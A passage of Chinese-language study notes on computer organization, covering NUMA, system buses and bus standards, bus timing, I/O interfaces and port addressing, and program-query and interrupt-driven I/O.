<li><strong>非统一存储访问（NUMA）多处理器</strong>：某些访存请求要比其他的快，具体取决于哪个处理器提出了访问请求以及访问哪个字，这是由于主存被分割并分配给了同一机器上的不同处理器或内存控制器。处理器中不带高速缓存时，被称为 NC-NUMA；处理器中带有一致性高速缓存时，被称为 CC-NUMA</li>
</ul>
<p>早期的计算机，内存控制器没有整合进 CPU，访存操作需要经过北桥芯片（集成了内存控制器，并与内存相连），CPU 通过前端总线和北桥芯片相连，这就是统一存储访问（UMA）构架。随着 CPU 性能提升由提高主频转到增加 CPU 数量（多核、多 CPU），越来越多的 CPU 对前端总线的争用使得前端总线成为瓶颈。为了消除 UMA 架构的瓶颈，非统一存储访问（NUMA）构架诞生，内存控制器被集成到 CPU 内部，每个 CPU 都有独立的内存控制器。每个 CPU 都独立连接到一部分内存，CPU 直连的这部分内存被称为本地内存。CPU 之间通过 QPI 总线相连。CPU 可以通过 QPI 总线访问其他 CPU 的远程内存。与 UMA 架构不同的是，在 NUMA 架构下，内存的访问出现了本地和远程的区别，访问本地内存明显要快于访问远程内存。</p>
<p>由于可能会出现多个处理器同时访问同一共享变量的情况，在操作共享变量时需要进行同步，否则，一个处理器可能会在其他处理器尚未完成对共享变量的修改时，就开始使用该变量。常用方法是通过对共享变量加锁的方式来控制对共享变量互斥访问。在一个时刻只能有一个处理器获得锁，其他要操作该共享变量的处理器必须等待，直到该处理器解锁该变量为止。</p>
<h2> 总线</h2>
<h3> 总线概述</h3>
<p>随着 <code>I/O</code> 设备的种类和数量越来越多，为了更好地解决 <code>I/O</code> 设备和主机之间连接的灵活性，计算机的结构从分散连接发展为总线连接。为了进一步简化设计，又提出了各类总线标准。</p>
<h4> 总线基本概念</h4>
<ol>
<li>
<p><strong>总线的定义</strong></p>
<p>总线是一组能为多个部件分时共享的公共信息传送线路。<strong>分时和共享是总线的两个特点</strong>。分时是指同一时刻只允许有一个部件向总线发送信息，若系统中有多个部件，则它们只能分时地向总线发送信息。共享是指总线上可以挂接多个部件，各个部件之间互相交换的信息都可通过这组线路分时共享，多个部件可同时从总线上接收相同的信息。</p>
</li>
<li>
<p><strong>总线设备</strong></p>
<p>总线上所连接的设备，按其对总线有无控制功能可分为 <strong>主设备</strong> 和 <strong>从设备</strong> 两种。</p>
<ul>
<li><strong>主设备</strong>：指获得总线控制权的设备</li>
<li><strong>从设备</strong>：指被主设备访问的设备，它只能响应从主设备发来的各种总线命令</li>
</ul>
</li>
<li>
<p><strong>总线特性</strong></p>
<p>总线特性是指机械特性（尺寸、形状）、电气特性（传输方向和有效的电平范围）、功能特性（每根传输线的功能）和时间特性（信号和时序的关系）。</p>
</li>
</ol>
<h4> 总线的分类</h4>
<p>计算机系统中的总线，按功能划分为以下四类：</p>
<ol>
<li>
<p><strong>片内总线</strong></p>
<p>片内总线是芯片内部的总线，它是 CPU 芯片内部寄存器与寄存器之间、寄存器与 ALU 之间的公共连接线。</p>
</li>
<li>
<p><strong>系统总线</strong></p>
<p>系统总线是计算机系统内各功能部件（CPU、主存、<code>I/O</code> 接口）之间相互连接的总线。按系统总线传输信息内容的不同，又可分为三类：<strong>数据总线</strong>、<strong>地址总线</strong> 和 <strong>控制总线。</strong></p>
<ul>
<li><strong>数据总线</strong>：用来传输各功能部件之间的数据信息，它是双向传输总线，其位数与机器字长、存储字长有关</li>
<li><strong>地址总线</strong>：用来指出数据总线上的源数据或目的数据所在的主存单元或 <code>I/O</code> 端口的地址，它是单向传输总线，地址总线的位数与主存地址空间的大小有关</li>
<li><strong>控制总线</strong>：传输的是控制信息，包括 CPU 送出的控制命令和主存（或外设）返回 CPU 的反馈信号</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">注意区分数据通路和数据总线</p>
<p>各个功能部件通过数据总线连接形成的数据传输路径称为 <a href="#%E6%95%B0%E6%8D%AE%E9%80%9A%E8%B7%AF%E7%9A%84%E5%8A%9F%E8%83%BD">数据通路</a>。数据通路表示的是数据流经的路径，而数据总线是承载的媒介</p>
</div>
</li>
<li>
<p><strong>I/O 总线</strong></p>
<p><code>I/O</code> 总线主要用于连接中低速的 <code>I/O</code> 设备，通过 <code>I/O</code> 接口与系统总线相连接，目的是将低速设备与高速总线分离，以提升总线的系统性能，常见的有 USB、PCI 总线。</p>
</li>
<li>
<p><strong>通信总线</strong></p>
<p>通信总线是在计算机系统之间或计算机系统与其他系统（如：远程通信设备、测试设备）之间传送信息的总线，通信总线也称外部总线。</p>
<p>此外，按时序控制方式可将总线划分为 <strong>同步总线</strong> 和 <strong>异步总线</strong>，还可按数据传输格式将总线划分为 <strong>并行总线</strong> 和 <strong>串行总线。</strong></p>
</li>
</ol>
<h4> 系统总线的结构</h4>
<ol>
<li>
<p><strong>单总线结构</strong></p>
<p>单总线结构将 CPU、主存、<code>I/O</code> 设备（通过 <code>I/O</code> 接口）都挂在一组总线上，允许 <code>I/O</code> 设备之间、<code>I/O</code> 设备与主存之间直接交换信息。CPU 与主存、CPU 与外设之间可直接进行信息交换，而无须经过中间设备的干预。</p>
<ul>
<li><strong>优点</strong>：结构简单，成本低，易于接入新的设备</li>
<li><strong>缺点</strong>：带宽低、负载重，多个部件只能争用唯一的总线，且不支持并发传送操作</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>单总线并不是指只有一根信号线，系统总线按传送信息的不同可细分为地址总线、数据总线和控制总线</p>
</div>
</li>
<li>
<p><strong>双总线结构</strong></p>
<p>双总线结构有两条总线：一条是 <strong>主存总线</strong>，用于在 CPU、主存和通道之间传送数据；另一条是 <strong>I/O 总线</strong>，用于在多个外部设备与通道之间传送数据。</p>
<ul>
<li><strong>优点</strong>：将低速 <code>I/O</code> 设备从单总线上分离出来，实现了存储器总线和 <code>I/O</code> 总线分离</li>
<li><strong>缺点</strong>：需要增加通道等硬件设备</li>
</ul>
</li>
<li>
<p><strong>三总线结构</strong></p>
<p>三总线结构是在计算机系统各部件之间采用三条各自独立的总线来构成信息通路，这三条总线分别为 <strong>主存总线</strong>、<strong>I/O 总线</strong> 和 <strong>直接内存访问（DMA）总线。</strong></p>
<p>主存总线用于在 CPU 和内存之间传送地址、数据和控制信息。I/O 总线用于在 CPU 和各类外设之间通信。DMA 总线用于在内存和高速外设之间直接传送数据。</p>
<ul>
<li><strong>优点</strong>：提高了 <code>I/O</code> 设备的性能，使其更快地响应命令，提高系统吞吐量</li>
<li><strong>缺点</strong>：系统工作效率较低</li>
</ul>
</li>
</ol>
<h4> 常见的总线标准</h4>
<p>总线标准是国际上公布的互连各个模块的标准，是把各种不同的模块组成计算机系统时必须遵守的规范。典型的总线标准有 <code>ISA</code>、<code>EISA</code>、<code>VESA</code>、<code>PCI</code>、<code>AGP</code>、<code>PCI-ExpresS</code>、<code>USB</code> 等。它们的主要区别是总线宽度、带宽、时钟频率、寻址能力、是否支持突发传送等。</p>
<ul>
<li><strong>ISA（Industry Standard Architecture）工业标准体系结构</strong>：是最早出现的微型计算机的系统总线，应用在 IBM 的 AT 机上</li>
<li><strong>EISA（Extended Industry Standard Architecture）扩展的 ISA</strong>：是为配合 <code>32</code> 位 CPU 而设计的扩展总线，EISA 对 ISA 完全兼容</li>
<li><strong>VESA（Video Electronics Standards Association）视频电子标准协会</strong>：是一个 <code>32</code> 位的局部总线，是针对多媒体 PC 要求高速传送活动图像的大量数据而推出的</li>
<li><strong>PCI（Peripheral Component Interconnect）外部设备互连</strong>：是高性能的 <code>32</code> 位或 <code>64</code> 位总线，是专为高度集成的外围部件、扩充插板和处理器/存储器系统设计的互连机制。目前常用的 PCI 适配器有显卡、声卡、网卡等。PCI 总线支持即插即用。PCI 总线是一个与处理器时钟频率无关的高速外围总线，属于局部总线</li>
<li><strong>AGP（Accelerated Graphics Port）加速图形接口</strong>：是一种视频接口标准，专用于连接主存和图形存储器，用于传输视频和三维图形数据，属于局部总线</li>
<li><strong>PCI-E（PCI-ExpresS）</strong>：是最新的总线接口标准，它将全面取代现行的 PCI 和 AGP</li>
<li><strong>RS-232C</strong>：是由美国电子工业协会（EIA）推荐的一种串行通信总线，是应用于串行二进制交换的数据终端设备（DTE）和数据通信设备（DCE）之间的标准接口</li>
<li><strong>USB（Universal Serial Bus）通用串行总线</strong>：是一种连接外部设备的 <code>I/O</code> 总线，属于设备总线。具有即插即用、热插拔等优点，有很强的连接能力</li>
<li><strong>PCMCIA（Personal Computer Memory Card International Association）广泛应用于笔记本电脑的一种接口标准</strong>：是一个用于扩展功能的小型插槽。具有即插即用功能</li>
<li><strong>IDE（Integrated Drive Electronics）集成设备电路</strong>：更准确地称为 ATA，是一种 IDE 接口磁盘驱动器接口类型，硬盘和光驱通过 IDE 接口与主板连接</li>
<li><strong>SCSI（Small Computer System Interface）小型计算机系统接口</strong>：是一种用于计算机和智能设备之间（硬盘、软驱）系统级接口的独立处理器标准</li>
<li><strong>SATA（Serial Advanced Technology Attachment）串行高级技术附件</strong>：是一种基于行业标准的串行硬件驱动器接口，是由 Intel、IBM、Dell 等公司共同提出的硬盘接口规范</li>
</ul>
<h4> 总线的性能指标</h4>
<ul>
<li><strong>总线传输周期</strong>：指一次总线操作所需的时间，包括申请阶段、寻址阶段、传输阶段和结束阶段。总线传输周期通常由若干总线时钟周期构成</li>
<li><strong>总线时钟周期</strong>：即机器的时钟周期。计算机有一个统一的时钟，以控制整个计算机的各个部件，总线也要受此时钟的控制</li>
<li><strong>总线工作频率</strong>：总线上各种操作的频率，为总线周期的倒数。实际上指 <code>1</code> 秒内传送几次数据。若总线周期 = <code>N</code> 个时钟周期，则总线的工作频率 = 时钟频率 / <code>N</code></li>
<li><strong>总线时钟频率</strong>：即机器的时钟频率，它为时钟周期的倒数</li>
<li><strong>总线宽度</strong>：又称总线位宽，它是总线上同时能够传输的数据位数，通常指数据总线的根数，如：<code>32</code> 根称为 <code>32</code> 位总线</li>
<li><strong>总线带宽</strong>：可理解为总线的最大数据传输率，即单位时间内总线上最多可传输数据的位数，通常用每秒传送信息的字节数来衡量，单位可用字节/秒（B/s）表示。总线带宽 = 总线工作频率 × (总线宽度 / 8)</li>
<li><strong>总线复用</strong>：总线复用是指一种信号线在不同的时间传输不同的信息，因此可以使用较少的线传输更多的信息，从而节省空间和成本</li>
<li><strong>信号线数</strong>：地址总线、数据总线和控制总线三种总线数的总和称为信号线数。其中，总线的最主要性能指标为总线宽度、总线（工作）频率、总线带宽，总线带宽是指总线本身所能达到的最高传输速率，它是衡量总线性能的重要指标</li>
</ul>
<p>例如：总线工作频率为 <code>22MHz</code>，总线宽度为 <code>16</code> 位，则总线带宽 = 22 × (16 / 8) = 44MB/s。</p>
<h3> 总线事务和定时</h3>
<p>总线定时是指 <strong>总线在双方交换数据的过程中需要时间上配合关系的控制</strong>，这种控制称为总线定时，其实质是一种协议或规则，主要有 <strong><a href="#%E5%90%8C%E6%AD%A5%E5%AE%9A%E6%97%B6%E6%96%B9%E5%BC%8F">同步</a></strong> 和 <strong><a href="#%E5%BC%82%E6%AD%A5%E5%AE%9A%E6%97%B6%E6%96%B9%E5%BC%8F">异步</a></strong> 两种基本定时方式。</p>
<h4> 总线事务</h4>
<p><strong>从请求总线到完成总线使用的操作序列</strong> 称为总线事务，它是在一个总线周期中发生的一系列活动。<strong>典型的总线事务包括</strong>：请求操作、仲裁操作、地址传输、数据传输和总线释放。</p>
<ul>
<li><strong>请求阶段</strong>：主设备（CPU 或 DMA）发出总线传输请求，并且获得总线控制权</li>
<li><strong>仲裁阶段</strong>：总线仲裁机构决定将下一个传输周期的总线使用权授予某个申请者</li>
<li><strong>寻址阶段</strong>：主设备通过总线给出要访问的从设备地址及有关命令，启动从模块</li>
<li><strong>传输阶段</strong>：主模块和从模块进行数据交换，可单向或双向进行数据传送</li>
<li><strong>释放阶段</strong>：主模块的有关信息均从系统总线上撤除，让出总线使用权</li>
</ul>
<p>在总线事务的传输阶段，主、从设备之间一般只能传输一个字长的数据。</p>
<p><strong>突发（猝发）</strong> 传送方式能够进行连续成组数据的传送，其寻址阶段发送的是连续数据单元的首地址，在传输阶段传送多个连续单元的数据，每个时钟周期可以传送一个字长的信息，但是不释放总线，直到一组数据全部传送完毕后，再释放总线。</p>
<h4> 同步定时方式</h4>
<p>同步定时方式是指 <strong>系统采用一个统一的时钟信号来协调发送和接收双方的传送定时关系</strong>。时钟产生相等的时间间隔，每个间隔构成一个总线周期。在一个总线周期中，发送方和接收方可以进行一次数据传送。因为采用统一的时钟，每个部件或设备发送或接收信息都在固定的总线传送周期中，一个总线的传送周期结束，下一个总线的传送周期开始。</p>
<ul>
<li><strong>优点</strong>：传送速度快，具有较高的传输速率；总线控制逻辑简单</li>
<li><strong>缺点</strong>：主从设备属于强制性同步；不能及时进行数据通信的有效性检验，可靠性较差</li>
</ul>
<p>同步通信适用于总线长度较短及总线所接部件的存取时间比较接近的系统。</p>
<h4> 异步定时方式</h4>
<p>在异步定时方式中，没有统一的时钟，也没有固定的时间间隔，完全依靠传送双方相互制约的 “握手” 信号来实现定时控制。通常，把交换信息的两个部件或设备分为主设备和从设备，主设备提出交换信息的 “请求” 信号，经接口传送到从设备；从设备接到主设备的请求后，通过接口向主设备发出 “回答” 信号。</p>
<ul>
<li><strong>优点</strong>：总线周期长度可变，能保证两个工作速度相差很大的部件或设备之间可靠地进行信息交换，自动适应时间的配合</li>
<li><strong>缺点</strong>：比同步控制方式稍复杂一些，速度比同步定时方式慢</li>
</ul>
<p>根据 “请求” 和 “回答” 信号的撤销是否互锁，<strong>异步定时方式又分为以下三种类型：</strong></p>
<ul>
<li><strong>不互锁方式</strong>：主设备发出 “请求” 信号后，不必等到接到从设备的 “回答” 信号，而是经过一段时间便撤销 “请求” 信号。而从设备在接到 “请求” 信号后，发出 “回答” 信号，并经过一段时间后自动撤销 “回答” 信号。双方不存在互锁关系</li>
<li><strong>半互锁方式</strong>：主设备发出 “请求” 信号后，必须在接到从设备的 “回答” 信号后，才撤销 “请求” 信号，有互锁的关系。而从设备在接到 “请求” 信号后，发出 “回答” 信号，但不必等待获知主设备的 “请求” 信号已经撤销，而是隔一段时间后自动撤销 “回答” 信号，不存在互锁关系</li>
<li><strong>全互锁方式</strong>：主设备发出 “请求” 信号后，必须在从设备 “回答” 后才撤销 “请求” 信号；从设备发出 “回答” 信号后，必须在获知主设备 “请求” 信号已撤销后，再撤销其 “回答” 信号。双方存在互锁关系</li>
</ul>
<h2> 输入/输出系统</h2>
<h3> I/O 系统基本概念</h3>
<h4> 输入/输出系统</h4>
<p>输入/输出是以主机为中心而言的，将信息从外部设备传送到主机称为输入，反之称为输出。输入/输出系统解决的主要问题是对各种形式的信息进行输入和输出的控制。</p>
<p><code>I/O</code> 系统中的几个基本概念如下：</p>
<ul>
<li><strong>外部设备</strong>：包括输入/输出设备及通过输入/输出接口才能访问的外存储设备</li>
<li><strong>接口</strong>：在各个外设与主机之间传输数据时进行各种协调工作的逻辑部件。协调包括传输过程中速度的匹配、电平和格式转换等</li>
<li><strong>输入设备</strong>：用于向计算机系统输入命令和文本、数据等信息的部件。键盘和鼠标是最基本的输入设备</li>
<li><strong>输出设备</strong>：用于将计算机系统中的信息输出到计算机外部进行显示、交换等的部件。显示器和打印机是最基本的输出设备</li>
<li><strong>外存设备</strong>：指除计算机内存及 CPU 缓存等外的存储器。如：硬磁盘、光盘等</li>
</ul>
<p>一般来说，<code>I/O</code> 系统由 <strong>I/O 软件</strong> 和 <strong>I/O 硬件</strong> 两部分构成：</p>
<ul>
<li><strong>I/O 软件</strong>：包括驱动程序、用户程序、管理程序、升级补丁等。通常采用 <code>I/O</code> 指令和通道指令实现 CPU 与 <code>I/O</code> 设备的信息交换</li>
<li><strong>I/O 硬件</strong>：包括外部设备、设备控制器和接口、<code>I/O</code> 总线等。通过设备控制器来控制 <code>I/O</code> 设备的具体动作；通过 <code>I/O</code> 接口与主机（总线）相连</li>
</ul>
<h4> I/O 控制方式</h4>
<p>在输入/输出系统中，经常需要进行大量的数据传输，而传输过程中有各种不同的 <code>I/O</code> 控制方式。</p>
<p><strong>基本的控制方式主要有以下四种：</strong></p>
<ul>
<li><strong><a href="#%E7%A8%8B%E5%BA%8F%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F">程序查询方式</a></strong>：由 CPU 通过程序不断查询 <code>I/O</code> 设备是否已做好准备，从而控制 <code>I/O</code> 设备与主机交换信息</li>
<li><strong><a href="#%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%96%AD%E6%96%B9%E5%BC%8F">程序中断方式</a></strong>：只在 <code>I/O</code> 设备准备就绪并向 CPU 发出中断请求时才予以响应</li>
<li><strong><a href="#dma-%E6%96%B9%E5%BC%8F">DMA 方式</a></strong>：主存和 <code>I/O</code> 设备之间有一条直接数据通路，当主存和 <code>I/O</code> 设备交换信息时，无须调用中断服务程序</li>
<li><strong>通道方式</strong>：在系统中设有通道控制部件，每个通道都挂接若干外设，主机在执行 <code>I/O</code> 命令时，只需启动有关通道，通道将执行通道程序，从而完成 <code>I/O</code> 操作</li>
</ul>
<p>其中，程序查询方式和程序中断方式主要用于数据传输率较低的外部设备；DMA 方式和通道方式主要用于数据传输率较高的设备。</p>
<h4> 外部设备</h4>
<p>最基本的外部设备主要有键盘、鼠标、显示器、打印机、磁盘存储器和光盘存储器等。</p>
<ol>
<li>
<p><strong>输入设备</strong></p>
<ul>
<li><strong>键盘</strong>：键盘是最常用的输入设备，通过它可发出命令或输入数据</li>
<li><strong>鼠标</strong>：鼠标是常用的定位输入设备，它把用户的操作与计算机屏幕上的位置信息相联系</li>
</ul>
</li>
<li>
<p><strong>输出设备</strong></p>
<ul>
<li>
<p><strong>显示器</strong>：按所用的显示器件分类，有阴极射线管（CRT）显示器、液晶显示器（LCD）、发光二极管（LED）显示器等。显示器属于用点阵方式运行的设备，有以下主要参数：</p>
<ul>
<li><strong>屏幕大小</strong>：以对角线长度表示，常用的有 <code>12~29</code> 英寸等</li>
<li><strong>分辨率</strong>：能表示的像素个数，屏幕上的每个光点就是一个像素，以宽和高的像素数的乘积表示，如：<code>800×600</code>、<code>1024×768</code> 和 <code>1280×1024</code> 等</li>
<li><strong>灰度级</strong>：指黑白显示器中所显示的像素点的亮暗差别，在彩色显示器中则表现为颜色的不同，灰度级越多，图像层次越清楚、逼真，典型的有 <code>8</code> 位（256 级）、<code>16</code> 位等</li>
<li><strong>刷新</strong>：光点只能保持极短的时间便会消失，为此必须在光点消失之前再重新扫描显示一遍，这个过程称为刷新</li>
<li><strong>刷新频率</strong>：指单位时间内扫描整个屏幕内容的次数。按照人的视觉生理，刷新频率大于 <code>30Hz</code> 时才不会感到闪烁，通常显示器的刷新频率为 <code>60～120Hz</code></li>
<li><strong>显示存储器（VRAM）</strong>：也称刷新存储器，为了不断提高刷新图像的信号，必须把一帧图像信息存储在刷新存储器中。其存储容量由图像分辨率和灰度级决定，分辨率越高，灰度级越多，刷新存储器容量越大</li>
</ul>
</li>
<li>
<p><strong>打印机</strong>：用于将计算机的处理结果打印在相关介质上。按工作方式，打印机可分为点阵打印机、针式打印机、喷墨式打印机、激光打印机等</p>
<ul>
<li><strong>针式打印机</strong>：针式打印机擅长 “多层复写打印”，实现各种票据或蜡纸等的打印。其工作原理简单，造价低廉，耗材（色带）便宜，但打印分辨率和打印速度不够高</li>
<li><strong>喷墨式打印机</strong>：彩色喷墨打印机基于三基色原理，即分别喷射三种颜色的墨滴，按一定的比例混合出所要求的颜色。喷墨式打印机可实现高质量彩色打印</li>
<li><strong>激光打印机</strong>：计算机输出的二进制信息，经过调制后的激光束扫描，在感光鼓上形成潜像，再经过显影、转印和定影，在纸上得到所需的字符或图像。激光打印机打印质量高、速度快、处理能力强，它是将激光技术和电子显像技术相结合的产物</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>外部存储器（辅存）</strong></p>
<ul>
<li><strong>磁表面存储器</strong>：是指把某些磁性材料薄薄地涂在金属铝或塑料表面上作为载磁体来存储信息。磁盘存储器、磁带存储器和磁鼓存储器均属于磁表面存储器</li>
<li><strong>固态硬盘（SSD）</strong>：微小型高档笔记本电脑采用高性能 Flash 存储器作为硬盘来记录数据，这种 “硬盘” 称为固态硬盘（SSD）。固态硬盘除需要 Flash 存储器外，还需要其他硬件和软件的支持</li>
<li><strong>光盘存储器</strong>：光盘存储器是利用光学原理读/写信息的存储装置，它采用聚焦激光束对盘式介质以非接触方式记录信息。完整的光盘存储系统由光盘片、光盘驱动器、光盘控制器等组成</li>
</ul>
</li>
</ol>
<h3> I/O 接口</h3>
<p><code>I/O</code> 接口（<code>I/O</code> 控制器）是主机和外设之间的交接界面，通过接口可以实现主机和外设之间的信息交换。主机和外设具有各自的工作特点，它们在信息形式和工作速度上具有很大的差异，接口正是为了解决这些差异而设置的。</p>
<h4> I/O 接口的功能</h4>
<p><strong>I/O 接口的主要功能如下：</strong></p>
<ul>
<li><strong>进行地址译码和设备选择</strong>：CPU 送来选择外设的地址码后，接口必须对地址进行译码以产生设备选择信息，使主机能和指定外设交换信息</li>
<li><strong>实现主机和外设的通信联络控制</strong>：解决主机与外设时序配合问题，协调不同工作速度的外设和主机之间交换信息，以保证整个计算机系统能统一、协调地工作</li>
<li><strong>实现数据缓冲</strong>：CPU 与外设之间的速度往往不匹配，为消除速度差异，接口必须设置数据缓冲寄存器，用于数据的暂存，以避免因速度不一致而丢失数据</li>
<li><strong>信号格式的转换</strong>：外设与主机两者的电平、数据格式都可能存在差异，接口应提供计算机与外设的信号格式的转换功能，如：电平转换、并/串或串/并转换、模/数或数/模转换等</li>
<li><strong>传送控制命令和状态信息</strong>：CPU 要启动某一外设时，通过接口中的命令寄存器向外设发出启动命令；外设准备就绪时，则将 “准备好” 状态信息送回接口中的状态寄存器，并反馈给 CPU。外设向 CPU 提出中断请求时，CPU 也应有相应的响应信号反馈给外设</li>
</ul>
<h4> I/O 接口的基本结构</h4>
<p><code>I/O</code> 接口在主机侧通过 <code>I/O</code> 总线与内存、CPU 相连。通过数据总线，在数据缓冲寄存器与内存或 CPU 的寄存器之间进行数据传送。同时接口和设备的状态信息被记录在状态寄存器中，通过数据线将状态信息送到 CPU。CPU 对外设的控制命令也通过数据线传送，一般将其送到 <code>I/O</code> 接口的控制寄存器。状态寄存器和控制寄存器在传送方向上是相反的。</p>
<p>接口中的地址线用于给出要访问的 <code>I/O</code> 接口中的寄存器的地址，它和读/写控制信号一起被送到 <code>I/O</code> 接口的控制逻辑部件，通过控制线传送来的读/写信号确认是读寄存器还是写寄存器，此外控制线还会传送一些仲裁信号和握手信号。</p>
<p>接口中的 <code>I/O</code> 控制逻辑还要能对控制寄存器中的命令字进行译码，并将译码得到的控制信号通过外设界面控制逻辑送到外设，同时将数据缓冲寄存器的数据发送到外设或从外设接收数据到数据缓冲寄存器。另外，它还要具有收集外设状态到状态寄存器的功能。</p>
<p>对数据缓冲寄存器、状态/控制寄存器的访问操作是通过相应的指令来完成的，通常称这类指令为 <code>I/O</code> 指令，<code>I/O</code> 指令只能在操作系统内核的底层 <code>I/O</code> 软件中使用，它们是一种特权指令。</p>
<h4> I/O 接口的类型</h4>
<p>从不同的角度看，<code>I/O</code> 接口可以分为不同的类型。</p>
<ul>
<li>
<p><strong>按数据传送方式</strong>：可分为并行接口（一字节或一个字的所有位同时传送）和串行接口（一位一位地传送），接口要完成数据格式的转换</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这里所说的数据传送方式指的是外设和接口一侧的传送方式</p>
</div>
</li>
<li>
<p><strong>按主机访问 I/O 设备的控制方式</strong>：可分为程序查询接口、中断接口和 DMA 接口等</p>
</li>
<li>
<p><strong>按功能选择的灵活性</strong>：可分为可编程接口和不可编程接口</p>
</li>
</ul>
<h4> I/O 端口及其编址</h4>
<p><code>I/O</code> 端口是指接口电路中可被 CPU 直接访问的寄存器，主要有数据端口、状态端口和控制端口，若干端口加上相应的控制逻辑电路组成接口。通常，CPU 能对数据端口执行读写操作，但对状态端口只能执行读操作，对控制端口只能执行写操作。</p>
<p><code>I/O</code> 端口要想能够被 CPU 访问，就必须要对各个端口进行编号，每个端口对应一个端口地址。而对 <strong>I/O 端口的编址方式</strong> 有与存储器统一编址和独立编址两种。</p>
<ul>
<li>
<p><strong>统一编址</strong>：又称存储器映射方式，是指把 <code>I/O</code> 端口当作存储器的单元进行地址分配，这种方式 CPU 不需要设置专门的 <code>I/O</code> 指令，用统一的访存指令就可以访问 <code>I/O</code> 端口</p>
<p><strong>优点</strong>：不需要专门的输入/输出指令，可使 CPU 访问 <code>I/O</code> 的操作更灵活、更方便，还可使端口有较大的编址空间。<strong>缺点</strong>：端口占用存储器地址，使内存容量变小，而且利用存储器编址的 <code>I/O</code> 设备进行数据输入/输出操作执行速度较慢。</p>
</li>
<li>
<p><strong>独立编址</strong>：又称 <code>I/O</code> 映射方式，<code>I/O</code> 端口的地址空间与主存地址空间是两个独立的地址空间，因而无法从地址码的形式上区分，需要设置专门的 <code>I/O</code> 指令来访间 <code>I/O</code> 端口</p>
<p><strong>优点</strong>：输入/输出指令与存储器指令有明显区别，程序编制清晰，便于理解。<strong>缺点</strong>：输入/输出指令少，一般只能对端口进行传送操作，尤其需要 CPU 提供存储器读/写、<code>I/O</code> 设备读/写两组控制信号，增加了控制的复杂性。</p>
</li>
</ul>
<h3> I/O 方式</h3>
<p>输入/输出系统实现主机与 <code>I/O</code> 设备之间的数据传送，可以采用不同的控制方式，各种方式在代价、性能、解决问题的着重点等方面各不相同，常用的 <code>I/O</code> 方式有程序查询、程序中断、DMA 和通道等，其中前两种方式更依赖于 CPU 中程序指令的执行。</p>
<h4> 程序查询方式</h4>
<p>信息交换的控制完全由 CPU 执行程序实现，程序查询方式接口中设置一个数据缓冲寄存器（数据端口）和一个设备状态寄存器（状态端口）。主机进行 <code>I/O</code> 操作时，先发出询问信号，读取设备的状态并根据设备状态决定下一步操作究竟是进行数据传送还是等待。</p>
<p><strong>程序查询方式的工作流程如下：</strong></p>
<ol>
<li>CPU 执行初始化程序，并预置传送参数</li>
<li>向 <code>I/O</code> 接口发出命令字，启动 <code>I/O</code> 设备</li>
<li>从外设接口读取其状态信息</li>
<li>CPU 不断查询 <code>I/O</code> 设备状态，直到外设准备就绪</li>
<li>传送一次数据</li>
<li>修改地址和计数器参数</li>
<li>判断传送是否结束，若未结束转第三步，直到计数器为 <code>0</code></li>
</ol>
<p>在这种控制方式下，CPU 一旦启动 <code>I/O</code>，就必须停止现行程序的运行，并在现行程序中插入一段程序。程序查询方式的主要特点是 CPU 有 “踏步” 等待现象，CPU 与 <code>I/O</code> 串行工作。这种方式的接口设计简单、设备量少，但 CPU 在信息传送过程中要花费很多时间来查询和等待，而且在一段时间内只能和一台外设交换信息，效率大大降低。</p>
<h4> 程序中断方式</h4>
<ol>
<li>
<p><strong>程序中断的基本概念</strong></p>
<p>程序中断是指在计算机执行现行程序的过程中，出现某些急需处理的异常情况或特殊请求，CPU 暂时中止现行程序，而转去对这些异常情况或特殊请求进行处理，处理完毕后再返回到现行程序的断点处，继续执行原程序。早期的中断技术是为了处理数据传送。</p>
<p>随着计算机的发展，中断技术不断被赋予新的功能，<strong>主要功能有：</strong></p>
<ul>
<li>实现 CPU 与 <code>I/O</code> 设备的并行工作</li>
<li>处理硬件故障和软件错误</li>
<li>实现人机交互，用户干预机器需要用到中断系统</li>
<li>实现多道程序、分时操作，多道程序的切换需借助于中断系统</li>
<li>实时处理需要借助中断系统来实现快速响应</li>
<li>实现应用程序和操作系统（管态程序）的切换，称为 “软中断”</li>
<li>多处理器系统中各处理器之间的信息交流和任务切换</li>
</ul>
<p><strong>程序中断方式的思想</strong>：CPU 在程序中安排好在某个时机启动某台外设，然后 CPU 继续执行当前的程序，不需要像查询方式那样一直等待外设准备就绪。一旦外设完成数据传送的准备工作，就主动向 CPU 发出中断请求，请求 CPU 为自已服务。在可以响应中断的条件下，CPU 暂时中止正在执行的程序，转去执行中断服务程序为外设服务，在中断服务程序中完成一次主机与外设之间的数据传送，传送完成后，CPU 返回原来的程序。</p>
</li>
<li>
<p><strong>程序中断的工作流程</strong></p>
<ol>
<li>
<p><strong>中断请求</strong></p>
<p>中断源是请求 CPU 中断的设备或事件，一台计算机允许有多个中断源。每个中断源向 CPU 发出中断请求的时间是随机的。为记录中断事件并区分不同的中断源，中断系统需对每个中断源设置中断请求标记触发器，当其状态为 <code>1</code> 时，表示中断源有请求。这些触发器可组成中断请求标记寄存器，该寄存器可集中在 CPU 中，也可分散在各个中断源中。</p>
<p>通过 INTR 线发出的是可屏蔽中断，通过 NMI 线发出的是不可屏蔽中断。可屏蔽中断的优先级最低，在关中断模式下不会被响应。不可屏蔽中断用于处理紧急和重要的事件，如：时钟中断、电源掉电等，其优先级最高，其次是内部异常，即使在关中断模式下也会被响应。</p>
</li>
<li>
<p><strong>中断响应判优</strong></p>
<p>中断响应优先级是指 CPU 响应中断请求的先后顺序。由于许多中断源提出中断请求的时间都是随机的，因此当多个中断源同时提出请求时，需通过中断判优逻辑来确定响应哪个中断源的请求，中断响应的判优通常是通过硬件排队器实现的。</p>
<p>一般来说，①不可屏蔽中断 &gt; 内部异常 &gt; 可屏蔽中断；②内部异常中，硬件故障 &gt; 软件中断；③DMA 中断请求优先于 <code>I/O</code> 设备传送的中断请求；④在 <code>I/O</code> 传送类中断请求中，高速设备优先于低速设备，输入设备优先于输出设备，实时设备优先于普通设备。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>中断优先级包括 <strong>响应优先级</strong> 和 <strong>处理优先级</strong>，响应优先级在硬件线路上是固定的，不便改动。处理优先级可利用中断屏蔽技术动态调整，以实现多重中断</p>
</div>
</li>
<li>
<p><strong>CPU 响应中断的条件</strong></p>
